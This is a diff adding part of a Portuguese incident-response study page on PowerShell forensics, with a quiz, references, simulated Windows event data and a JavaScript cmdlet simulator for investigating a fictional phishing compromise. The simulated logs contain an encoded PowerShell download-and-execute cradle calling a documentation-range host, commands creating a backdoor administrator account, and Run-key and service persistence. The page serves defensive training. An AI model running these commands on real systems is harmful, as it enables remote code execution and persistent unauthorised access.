+                    <p>Ela evita execução acidental de scripts. A defesa vem de AMSI, Constrained Language Mode com controle de aplicações e log de ScriptBlock.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 3 (ScriptBlock):</strong> A linha de comando mostra <code>powershell -enc SQBFAFgA...</code>. Onde ver o que o comando realmente fez?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> No evento 4104 (ScriptBlock) do log Microsoft-Windows-PowerShell/Operational.</p>
+                    <p>O 4104 registra o script já decodificado. Também dá para decodificar à mão: o <code>-enc</code> é Base64 de texto UTF-16LE.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 4 (Logon):</strong> Qual LogonType indica acesso por Área de Trabalho Remota, e qual indica acesso a um compartilhamento de rede?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> 10 para RDP e 3 para rede.</p>
+                    <p>O tipo 2 é o logon no teclado, o 7 é o desbloqueio de tela e o 5 é o de serviço. O tipo muda o significado do mesmo evento 4624.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 5 (Registro):</strong> Por que um malware que entrou por um usuário comum costuma usar a chave Run do HKCU, e não a do HKLM?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Porque gravar no HKCU não exige privilégio de administrador, e a chave executa o programa a cada logon daquele usuário.</p>
+                    <p>O HKLM vale para todos os usuários, mas exige administrador. Na investigação, revise as duas e compare com a lista conhecida.</p>
+                </div>
+            </details>
+        </div>
+
+        <div class="quiz-item">
+            <div class="quiz-question">
+                <strong>Questão 6 (Serviço):</strong> O evento 7045 mostra um serviço novo com binário em <code>C:\Users\Public</code>, rodando como LocalSystem. O que isso representa?
+            </div>
+            <details class="quiz-details">
+                <summary class="quiz-toggle">Ver resposta explicada</summary>
+                <div class="quiz-answer">
+                    <p><strong>Resposta:</strong> Persistência com o maior privilégio da máquina (T1543.003).</p>
+                    <p>Serviços legítimos ficam em <code>Program Files</code> ou <code>System32</code>. Um binário numa pasta gravável por todos, rodando como LocalSystem, sobrevive a reinícios e dá controle total.</p>
+                </div>
+            </details>
+        </div>
+    </section>
+
+    <!-- SEÇÃO 6: FATOS E REFERÊNCIAS -->
+    <section class="study-section" id="fatos">
+        <div class="section-header">
+            <span class="section-tag">Seção 06</span>
+            <h2>Fatos Essenciais, Referências e Próximos Passos</h2>
+        </div>
+
+        <div class="facts-grid">
+            <div class="facts-card">
+                <h4>1. Objetos no pipeline</h4>
+                <p>Verbo-Substantivo; Where-Object, Select-Object, Sort-Object e Group-Object; Get-Member mostra as propriedades.</p>
+            </div>
+            <div class="facts-card">
+                <h4>2. Eventos-chave</h4>
+                <p>4624/4625, 4672, 4688, 4720/4732, 4698, 7045 e 1102; LogonType 2, 3, 7 e 10.</p>
+            </div>
+            <div class="facts-card">
+                <h4>3. Sysmon e 4104</h4>
+                <p>Sysmon 1, 3, 11 e 13; o 4104 mostra o script decodificado.</p>
+            </div>
+            <div class="facts-card">
+                <h4>4. Persistência</h4>
+                <p>Run no HKLM e no HKCU, serviços e tarefas; execution policy não protege.</p>
+            </div>
+        </div>
+
+        <h3>Referências</h3>
+        <ul>
+            <li>Microsoft Learn — documentação do PowerShell, Get-WinEvent e about_Logging_Windows.</li>
+            <li>Microsoft Learn — eventos de auditoria de segurança do Windows e Sysmon.</li>
+            <li>NSA e parceiros — Keeping PowerShell: Security Measures to Use and Embrace.</li>
+            <li>MITRE ATT&amp;CK — T1059.001, T1547.001, T1136.001, T1543.003 e T1566.001.</li>
+        </ul>
+
+        <div class="callout tip" style="margin-top: 1.5rem;">
+            <div class="callout-title">
+                <span class="callout-icon">🎯</span>
+                <strong>Próximos Estudos: 15 — Engenharia Social e Phishing e 10 — Segurança em Endpoints e EDR</strong>
+            </div>
+            <p>
+                O anexo que a Fernanda abriu é o tema do Estudo 15. O Estudo 10 mostra como um EDR teria bloqueado o Word abrindo o PowerShell.
+            </p>
+        </div>
+    </section>
+
+</article>
+
+<!-- DADOS DO SIMULADOR (lidos pelo motor abaixo e validados pelos testes) -->
+<script type="application/json" id="ps-dados">
+{
+ "contexto": "Estação fictícia EST-FIN-07 do financeiro da Ipê Store, usuária fernanda.alves (administradora local, o que já é um problema). Horários locais de 12/11/2025; IPs externos de faixas de documentação.",
+ "host": "EST-FIN-07",
+ "eventos": [
+  {
+   "TimeCreated": "2025-03-01 10:12:40",
+   "Id": 7045,
+   "LogName": "System",
+   "ProviderName": "Service Control Manager",
+   "Message": "Serviço instalado no sistema",
+   "ServiceName": "AgenteGestorTI",
+   "ImagePath": "\"C:\\Program Files\\GestorTI\\agent.exe\"",
+   "StartType": "auto start",
+   "AccountName": "LocalSystem"
+  },
+  {
+   "TimeCreated": "2025-11-12 07:30:05",
+   "Id": 4104,
+   "LogName": "Microsoft-Windows-PowerShell/Operational",
+   "ProviderName": "Microsoft-Windows-PowerShell",
+   "Message": "Bloco de script registrado (agente GestorTI)",
+   "ScriptBlockText": "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version",
+   "Path": "C:\\Program Files\\GestorTI\\inventario.ps1"
+  },
+  {
+   "TimeCreated": "2025-11-12 08:01:50",
+   "Id": 4625,
+   "LogName": "Security",
+   "ProviderName": "Microsoft-Windows-Security-Auditing",
+   "Message": "Falha de logon: senha incorreta",
+   "TargetUserName": "fernanda.alves",
+   "LogonType": 2,
+   "IpAddress": "127.0.0.1"
+  },
+  {
+   "TimeCreated": "2025-11-12 08:02:10",
+   "Id": 4624,
+   "LogName": "Security",
+   "ProviderName": "Microsoft-Windows-Security-Auditing",
+   "Message": "Logon bem-sucedido",
+   "TargetUserName": "fernanda.alves",
+   "LogonType": 2,
+   "IpAddress": "127.0.0.1"
+  },
+  {
+   "TimeCreated": "2025-11-12 08:02:10",
+   "Id": 4672,
+   "LogName": "Security",
+   "ProviderName": "Microsoft-Windows-Security-Auditing",
+   "Message": "Privilégios especiais atribuídos ao novo logon",
+   "SubjectUserName": "fernanda.alves"
+  },
+  {
+   "TimeCreated": "2025-11-12 08:02:31",
+   "Id": 1,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Processo criado: OneDrive.exe",
+   "ProcessId": 4120,
+   "Image": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
+   "CommandLine": "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "User": "IPESTORE\\fernanda.alves"
+  },
+  {
+   "TimeCreated": "2025-11-12 08:03:12",
+   "Id": 3,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Conexão de rede: msedge.exe",
+   "ProcessId": 5012,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "DestinationIp": "10.20.1.5",
+   "DestinationPort": 8080
+  },
+  {
+   "TimeCreated": "2025-11-12 09:15:00",
+   "Id": 4624,
+   "LogName": "Security",
+   "ProviderName": "Microsoft-Windows-Security-Auditing",
+   "Message": "Logon bem-sucedido (desbloqueio)",
+   "TargetUserName": "fernanda.alves",
+   "LogonType": 7,
+   "IpAddress": "127.0.0.1"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:40:55",
+   "Id": 1,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Processo criado: WINWORD.EXE",
+   "ProcessId": 6230,
+   "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+   "CommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\fernanda.alves\\Downloads\\Fatura_Novembro.docm\"",
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "User": "IPESTORE\\fernanda.alves"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:41:07",
+   "Id": 1,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Processo criado: powershell.exe",
+   "ProcessId": 6410,
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAyADAAMwAuADAALgAxADEAMwAuADgAMAAvAGEALgBwAHMAMQAnACkA",
+   "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+   "User": "IPESTORE\\fernanda.alves"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:41:08",
+   "Id": 4104,
+   "LogName": "Microsoft-Windows-PowerShell/Operational",
+   "ProviderName": "Microsoft-Windows-PowerShell",
+   "Message": "Bloco de script registrado",
+   "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://203.0.113.80/a.ps1')",
+   "Path": ""
+  },
+  {
+   "TimeCreated": "2025-11-12 09:41:09",
+   "Id": 3,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Conexão de rede: powershell.exe",
+   "ProcessId": 6410,
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "DestinationIp": "203.0.113.80",
+   "DestinationPort": 443
+  },
+  {
+   "TimeCreated": "2025-11-12 09:42:30",
+   "Id": 11,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Arquivo criado",
+   "ProcessId": 6410,
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "TargetFilename": "C:\\Users\\Public\\wuhelper.exe"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:43:10",
+   "Id": 13,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Valor de Registro definido",
+   "ProcessId": 6410,
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "TargetObject": "HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdateHelper",
+   "Details": "C:\\Users\\Public\\wuhelper.exe"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:44:29",
+   "Id": 1,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Processo criado: net.exe",
+   "ProcessId": 6702,
+   "Image": "C:\\Windows\\System32\\net.exe",
+   "CommandLine": "net user svc_update Senha@2025! /add",
+   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "User": "IPESTORE\\fernanda.alves"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:44:30",
+   "Id": 4720,
+   "LogName": "Security",
+   "ProviderName": "Microsoft-Windows-Security-Auditing",
+   "Message": "Conta de usuário criada",
+   "TargetUserName": "svc_update",
+   "SubjectUserName": "fernanda.alves"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:44:40",
+   "Id": 1,
+   "LogName": "Microsoft-Windows-Sysmon/Operational",
+   "ProviderName": "Microsoft-Windows-Sysmon",
+   "Message": "Processo criado: net.exe",
+   "ProcessId": 6710,
+   "Image": "C:\\Windows\\System32\\net.exe",
+   "CommandLine": "net localgroup Administradores svc_update /add",
+   "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "User": "IPESTORE\\fernanda.alves"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:44:41",
+   "Id": 4732,
+   "LogName": "Security",
+   "ProviderName": "Microsoft-Windows-Security-Auditing",
+   "Message": "Membro adicionado a grupo local",
+   "TargetUserName": "Administradores",
+   "MemberName": "svc_update",
+   "SubjectUserName": "fernanda.alves"
+  },
+  {
+   "TimeCreated": "2025-11-12 09:46:02",
+   "Id": 7045,
+   "LogName": "System",
+   "ProviderName": "Service Control Manager",
+   "Message": "Serviço instalado no sistema",
+   "ServiceName": "WinUpdateHelper",
+   "ImagePath": "C:\\Users\\Public\\wuhelper.exe",
+   "StartType": "auto start",
+   "AccountName": "LocalSystem"
+  },
+  {
+   "TimeCreated": "2025-11-12 10:05:00",
+   "Id": 4625,
+   "LogName": "Security",
+   "ProviderName": "Microsoft-Windows-Security-Auditing",
+   "Message": "Falha de logon: senha incorreta",
+   "TargetUserName": "administrador",
+   "LogonType": 3,
+   "IpAddress": "10.20.5.44"
+  },
+  {
+   "TimeCreated": "2025-11-12 10:05:04",
+   "Id": 4625,
+   "LogName": "Security",
+   "ProviderName": "Microsoft-Windows-Security-Auditing",
+   "Message": "Falha de logon: senha incorreta",
+   "TargetUserName": "administrador",
+   "LogonType": 3,
+   "IpAddress": "10.20.5.44"
+  }
+ ],
+ "registro": {
+  "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run": {
+   "SecurityHealth": "%windir%\\system32\\SecurityHealthSystray.exe",
+   "AgenteGestorTI": "\"C:\\Program Files\\GestorTI\\agent.exe\" --tray"
+  },
+  "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run": {
+   "OneDrive": "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background",
+   "WinUpdateHelper": "C:\\Users\\Public\\wuhelper.exe"
+  }
+ },
+ "run_conhecidos": [
+  "SecurityHealth",
+  "AgenteGestorTI",
+  "OneDrive"
+ ],
+ "servicos": [
+  {
+   "Name": "AgenteGestorTI",
+   "DisplayName": "Agente GestorTI",
+   "Status": "Running",
+   "StartType": "Automatic",
+   "PathName": "\"C:\\Program Files\\GestorTI\\agent.exe\"",
+   "StartName": "LocalSystem"
+  },
+  {
+   "Name": "Dnscache",
+   "DisplayName": "Cliente DNS",
+   "Status": "Running",
+   "StartType": "Automatic",
+   "PathName": "C:\\Windows\\system32\\svchost.exe -k NetworkService",
+   "StartName": "NT AUTHORITY\\NetworkService"
+  },
+  {
+   "Name": "EventLog",
+   "DisplayName": "Log de Eventos do Windows",
+   "Status": "Running",
+   "StartType": "Automatic",
+   "PathName": "C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted",
+   "StartName": "NT AUTHORITY\\LocalService"
+  },
+  {
+   "Name": "Sysmon64",
+   "DisplayName": "Sysmon64",
+   "Status": "Running",
+   "StartType": "Automatic",
+   "PathName": "C:\\Windows\\Sysmon64.exe",
+   "StartName": "LocalSystem"
+  },
+  {
+   "Name": "Spooler",
+   "DisplayName": "Spooler de Impressão",
+   "Status": "Running",
+   "StartType": "Automatic",
+   "PathName": "C:\\Windows\\System32\\spoolsv.exe",
+   "StartName": "LocalSystem"
+  },
+  {
+   "Name": "WinUpdateHelper",
+   "DisplayName": "WinUpdateHelper",
+   "Status": "Running",
+   "StartType": "Automatic",
+   "PathName": "C:\\Users\\Public\\wuhelper.exe",
+   "StartName": "LocalSystem"
+  },
+  {
+   "Name": "wuauserv",
+   "DisplayName": "Windows Update",
+   "Status": "Stopped",
+   "StartType": "Manual",
+   "PathName": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
+   "StartName": "LocalSystem"
+  }
+ ],
+ "usuarios": [
+  {
+   "Name": "Administrator",
+   "Enabled": false,
+   "Description": "Conta interna para administrar o computador"
+  },
+  {
+   "Name": "DefaultAccount",
+   "Enabled": false,
+   "Description": "Conta gerenciada pelo sistema"
+  },
+  {
+   "Name": "fernanda.alves",
+   "Enabled": true,
+   "Description": "Financeiro"
+  },
+  {
+   "Name": "Guest",
+   "Enabled": false,
+   "Description": "Conta interna para acesso convidado"
+  },
+  {
+   "Name": "svc_update",
+   "Enabled": true,
+   "Description": ""
+  }
+ ],
+ "membros_admin": [
+  {
+   "ObjectClass": "User",
+   "Name": "EST-FIN-07\\Administrator",
+   "PrincipalSource": "Local"
+  },
+  {
+   "ObjectClass": "Group",
+   "Name": "IPESTORE\\Domain Admins",
+   "PrincipalSource": "ActiveDirectory"
+  },
+  {
+   "ObjectClass": "User",
+   "Name": "EST-FIN-07\\fernanda.alves",
+   "PrincipalSource": "Local"
+  },
+  {
+   "ObjectClass": "User",
+   "Name": "EST-FIN-07\\svc_update",
+   "PrincipalSource": "Local"
+  }
+ ],
+ "processos": [
+  {
+   "Id": 4,
+   "ProcessName": "System",
+   "Path": ""
+  },
+  {
+   "Id": 2140,
+   "ProcessName": "explorer",
+   "Path": "C:\\Windows\\explorer.exe"
+  },
+  {
+   "Id": 4120,
+   "ProcessName": "OneDrive",
+   "Path": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe"
+  },
+  {
+   "Id": 5012,
+   "ProcessName": "msedge",
+   "Path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"
+  },
+  {
+   "Id": 6230,
+   "ProcessName": "WINWORD",
+   "Path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+  },
+  {
+   "Id": 6410,
+   "ProcessName": "powershell",
+   "Path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  },
+  {
+   "Id": 7020,
+   "ProcessName": "wuhelper",
+   "Path": "C:\\Users\\Public\\wuhelper.exe"
+  }
+ ],
+ "conexoes": [
+  {
+   "LocalAddress": "10.20.5.71",
+   "LocalPort": 51544,
+   "RemoteAddress": "203.0.113.80",
+   "RemotePort": 443,
+   "State": "Established",
+   "OwningProcess": 7020
+  },
+  {
+   "LocalAddress": "10.20.5.71",
+   "LocalPort": 51320,
+   "RemoteAddress": "10.20.1.5",
+   "RemotePort": 8080,
+   "State": "Established",
+   "OwningProcess": 5012
+  },
+  {
+   "LocalAddress": "0.0.0.0",
+   "LocalPort": 135,
+   "RemoteAddress": "0.0.0.0",
+   "RemotePort": 0,
+   "State": "Listen",
+   "OwningProcess": 1012
+  },
+  {
+   "LocalAddress": "0.0.0.0",
+   "LocalPort": 445,
+   "RemoteAddress": "0.0.0.0",
+   "RemotePort": 0,
+   "State": "Listen",
+   "OwningProcess": 4
+  }
+ ],
+ "respostas": {
+  "processo_pai": "WINWORD.EXE",
+  "destino": "203.0.113.80:443",
+  "conta": "svc_update",
+  "run": "WinUpdateHelper"
+ }
+}
+</script>
+
+<script>
+(function() {
+    var PS = JSON.parse(document.getElementById("ps-dados").textContent);
+    var ATALHOS = [
+        "Get-WinEvent -LogName Security | Group-Object Id",
+        "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} | Select-Object TimeCreated, Image, ParentImage",
+        "Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
+        "Get-LocalGroupMember Administradores"
+    ];
+    var PADRAO = {
+        evento: ["TimeCreated", "Id", "Message"], grupo: ["Count", "Name"], servico: ["Status", "Name", "DisplayName"],
+        cim: ["Name", "State", "StartMode", "PathName"], usuario: ["Name", "Enabled", "Description"],
+        membro: ["ObjectClass", "Name", "PrincipalSource"], processo: ["Id", "ProcessName", "Path"],
+        conexao: ["LocalAddress", "LocalPort", "RemoteAddress", "RemotePort", "State", "OwningProcess"], medida: ["Count"]
+    };
+    var TIPOS = {
+        evento: "System.Diagnostics.Eventing.Reader.EventLogRecord", grupo: "Microsoft.PowerShell.Commands.GroupInfo",
+        servico: "System.ServiceProcess.ServiceController", cim: "Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Service",
+        usuario: "Microsoft.PowerShell.Commands.LocalUser", membro: "Microsoft.PowerShell.Commands.LocalPrincipal",
+        processo: "System.Diagnostics.Process", conexao: "Microsoft.Management.Infrastructure.CimInstance#ROOT/StandardCimv2/MSFT_NetTCPConnection",
+        registro: "System.Management.Automation.PSCustomObject", selecao: "Selected.System.Management.Automation.PSCustomObject",
+        medida: "Microsoft.PowerShell.Commands.GenericMeasureInfo"
+    };
+    var ALIASES = {
+        "?": "where-object", "where": "where-object", "select": "select-object", "sort": "sort-object", "group": "group-object",
+        "measure": "measure-object", "fl": "format-list", "ft": "format-table", "gsv": "get-service", "gps": "get-process",
+        "gcm": "get-command", "gm": "get-member", "cls": "clear-host", "clear": "clear-host", "help": "get-help", "gp": "get-itemproperty"
+    };
+    var AJUDA = {
+        "get-winevent": "Get-WinEvent [-LogName] <log> [-MaxEvents <n>] | Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624,4625}\n  Logs: Security, System, Microsoft-Windows-Sysmon/Operational, Microsoft-Windows-PowerShell/Operational",
+        "where-object": "Where-Object { $_.Propriedade -eq 'valor' -and $_.Outra -like '*x*' }   ou   Where-Object Propriedade -eq valor\n  Operadores: -eq -ne -like -notlike -match -notmatch -gt -lt -ge -le, -and -or -not",
+        "select-object": "Select-Object Prop1, Prop2 [-First n] [-Last n]   |   Select-Object -ExpandProperty Prop",
+        "sort-object": "Sort-Object Propriedade [-Descending]",
+        "group-object": "Group-Object Propriedade   (devolve Count e Name)",
+        "get-itemproperty": "Get-ItemProperty 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'",
+        "get-member": "<comando> | Get-Member   (mostra as propriedades dos objetos)"
+    };
+    var CMDLETS = ["Get-WinEvent", "Get-ItemProperty", "Get-Service", "Get-CimInstance", "Get-LocalUser", "Get-LocalGroupMember", "Get-Process",
+        "Get-NetTCPConnection", "Where-Object", "Select-Object", "Sort-Object", "Group-Object", "Measure-Object", "Format-List", "Format-Table",
+        "Get-Member", "Get-Command", "Get-Help", "Clear-Host"];
+    var historico = [], posHist = 0;
+
+    function el(tag, texto, estilo) {
+        var e = document.createElement(tag);
+        if (texto !== undefined && texto !== null) e.textContent = texto;
+        if (estilo) e.setAttribute("style", estilo);
+        return e;
+    }
+    function erro(msg) { var e = new Error(msg); e.ps = true; return e; }
+    function obj(tipo, base) { var o = JSON.parse(JSON.stringify(base)); Object.defineProperty(o, "_tipo", { value: tipo, enumerable: false, writable: true }); return o; }
+    function props(o) { return Object.keys(o); }
+    function prop(o, nome) {
+        if (o === null || typeof o !== "object") return undefined;
+        var k = props(o).filter(function(p) { return p.toLowerCase() === String(nome).toLowerCase(); })[0];
+        return k === undefined ? undefined : o[k];
+    }
+    function texto(v) {
+        if (v === true) return "True";
+        if (v === false) return "False";
+        if (v === null || v === undefined) return "";
+        return String(v);
+    }
+
+    // ------------------------------------------------------------ tokens
+    function dividirPipeline(linha) {
+        var partes = [], atual = "", q = null, prof = 0;
+        for (var i = 0; i < linha.length; i++) {
+            var c = linha[i];
+            if (q) { atual += c; if (c === q) q = null; continue; }
+            if (c === "'" || c === "\"") { q = c; atual += c; continue; }
+            if (c === "{") prof++;
+            if (c === "}") prof--;
+            if (c === "|" && prof === 0) { partes.push(atual.trim()); atual = ""; continue; }
+            atual += c;
+        }
+        if (q) throw erro("A cadeia de caracteres não tem o terminador: " + q);
+        if (prof !== 0) throw erro("Chave de abertura '{' sem a chave de fechamento '}' correspondente.");
+        partes.push(atual.trim());
+        return partes;
+    }
+    function tokens(seg) {
+        var out = [], i = 0;
+        while (i < seg.length) {
+            var c = seg[i];
+            if (/\s/.test(c)) { i++; continue; }
+            if (c === "{" || (c === "@" && seg[i + 1] === "{")) {
+                var ini = i, prof = 0, q = null;
+                for (; i < seg.length; i++) {
+                    var d = seg[i];
+                    if (q) { if (d === q) q = null; continue; }
+                    if (d === "'" || d === "\"") { q = d; continue; }
+                    if (d === "{") prof++;
+                    if (d === "}") { prof--; if (prof === 0) { i++; break; } }
+                }
+                out.push({ bloco: seg.slice(ini, i) });
+                continue;
+            }
+            if (c === "'" || c === "\"") {
+                var j = seg.indexOf(c, i + 1);
+                if (j === -1) throw erro("A cadeia de caracteres não tem o terminador: " + c);
+                var v = seg.slice(i + 1, j);
+                i = j + 1;
+                while (seg[i] === ",") { var k = i + 1; while (/\s/.test(seg[k] || "")) k++; var fim = seg.slice(k).search(/[\s|]/); var prox = fim === -1 ? seg.slice(k) : seg.slice(k, k + fim); v += "," + prox.replace(/^['"]|['"]$/g, ""); i = fim === -1 ? seg.length : k + fim; }
+                out.push({ v: v, aspas: true });
+                continue;
+            }
+            var m = seg.slice(i).match(/^[^\s]+/)[0];
+            i += m.length;
+            if (/,$/.test(m)) { var r = seg.slice(i).match(/^\s*([^\s]+)/); if (r) { m += r[1]; i += r[0].length; } }
+            out.push({ v: m });
+        }
+        return out;
+    }
+    function lista(v) { return String(v).split(",").map(function(x) { return x.trim().replace(/^['"]|['"]$/g, ""); }).filter(Boolean); }
+    function parametros(toks) {
+        var nomeados = {}, posicionais = [], chaves = [];
+        for (var i = 0; i < toks.length; i++) {
+            var t = toks[i];
+            if (!t.bloco && !t.aspas && /^-[A-Za-z]/.test(t.v)) {
+                var n = t.v.slice(1).toLowerCase(), prox = toks[i + 1];
+                if (prox && !(prox.v && !prox.aspas && /^-[A-Za-z]/.test(prox.v))) { nomeados[n] = prox; i++; }
+                else nomeados[n] = true;
+                chaves.push(n);
+            } else {
+                posicionais.push(t);
+            }
+        }
+        return { n: nomeados, p: posicionais };
+    }
+    function valorDe(t) { return t === true ? true : (t.bloco !== undefined ? t.bloco : t.v); }
+
+    // ------------------------------------------------------------ comparação
+    function literal(t) {
+        if (/^'.*'$|^".*"$/.test(t)) return t.slice(1, -1);
+        if (/^\$true$/i.test(t)) return true;
+        if (/^\$false$/i.test(t)) return false;
+        if (/^\$null$/i.test(t)) return null;
+        return t;
+    }
+    function numero(v) { return typeof v === "number" ? v : (typeof v === "string" && /^-?\d+(\.\d+)?$/.test(v) ? Number(v) : NaN); }
+    function curinga(p) { return new RegExp("^" + String(p).replace(/[.+^${}()|[\]\\]/g, "\\$&").replace(/\*/g, ".*").replace(/\?/g, ".") + "$", "i"); }
+    function comparar(a, op, b) {
+        op = op.toLowerCase();
+        if (typeof b === "boolean" || typeof a === "boolean") {
+            var ab = typeof a === "boolean" ? a : String(a).toLowerCase() === "true";
+            if (op === "-eq") return ab === b; if (op === "-ne") return ab !== b;
+        }
+        var na = numero(a), nb = numero(b), num = !isNaN(na) && !isNaN(nb);
+        var sa = texto(a).toLowerCase(), sb = texto(b).toLowerCase();
+        switch (op) {
+            case "-eq": return num ? na === nb : sa === sb;
+            case "-ne": return num ? na !== nb : sa !== sb;
+            case "-like": return curinga(b).test(texto(a));
+            case "-notlike": return !curinga(b).test(texto(a));
+            case "-match": try { return new RegExp(String(b), "i").test(texto(a)); } catch (e) { throw erro("Padrão de expressão regular inválido: " + b); }
+            case "-notmatch": try { return !new RegExp(String(b), "i").test(texto(a)); } catch (e2) { throw erro("Padrão de expressão regular inválido: " + b); }
+            case "-gt": return num ? na > nb : sa > sb;
+            case "-lt": return num ? na < nb : sa < sb;
+            case "-ge": return num ? na >= nb : sa >= sb;
+            case "-le": return num ? na <= nb : sa <= sb;
+        }
+        throw erro("Operador não suportado neste laboratório: " + op);
+    }
+    function compilarBloco(bloco) {
+        var corpo = bloco.replace(/^\{|\}$/g, "").trim();
+        var tk = corpo.match(/\$_\.[A-Za-z0-9_#]+|'[^']*'|"[^"]*"|\(|\)|-[A-Za-z]+|[^\s()]+/g) || [];
+        var pos = 0;
+        function ver() { return tk[pos] ? tk[pos].toLowerCase() : null; }
+        function ou() { var a = e_(); while (ver() === "-or") { pos++; var b = e_(), x = a; a = (function(p, q) { return function(o) { return p(o) || q(o); }; })(x, b); } return a; }
+        function e_() { var a = nao(); while (ver() === "-and") { pos++; var b = nao(), x = a; a = (function(p, q) { return function(o) { return p(o) && q(o); }; })(x, b); } return a; }
+        function nao() { if (ver() === "-not" || ver() === "!") { pos++; var a = nao(); return function(o) { return !a(o); }; } return prim(); }
+        function prim() {
+            var t = tk[pos++];
+            if (!t) throw erro("Expressão incompleta em Where-Object.");
+            if (t === "(") { var v = ou(); if (tk[pos++] !== ")") throw erro("Falta o parêntese de fechamento ')'."); return v; }
+            var m = t.match(/^\$_\.(.+)$/);
+            if (!m) throw erro("Em Where-Object, compare uma propriedade: { $_.Propriedade -eq 'valor' }.");
+            var op = tk[pos++], val = tk[pos++];
+            if (!op || !/^-/.test(op) || val === undefined) throw erro("Use: $_." + m[1] + " -operador valor");
+            var lit = literal(val), nome = m[1];
+            return function(o) { return comparar(prop(o, nome), op, lit); };
+        }
+        var f = ou();
+        if (pos !== tk.length) throw erro("Não entendi a partir de '" + tk[pos] + "' em Where-Object.");
+        return f;
+    }
+
+    // ------------------------------------------------------------ cmdlets
+    function hashtable(bloco) {
+        var corpo = bloco.replace(/^@\{|\}$/g, ""), out = {};
+        corpo.split(/;|\n/).forEach(function(par) {
+            if (!par.trim()) return;
+            var m = par.match(/^\s*([A-Za-z]+)\s*=\s*(.+?)\s*$/);
+            if (!m) throw erro("Hashtable inválida perto de: " + par.trim());
+            out[m[1].toLowerCase()] = lista(m[2]);
+        });
+        return out;
+    }
+    var LOGS = ["Security", "System", "Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-PowerShell/Operational"];
+    function logCanonico(n) {
+        var l = LOGS.filter(function(x) { return x.toLowerCase() === String(n).toLowerCase(); })[0];
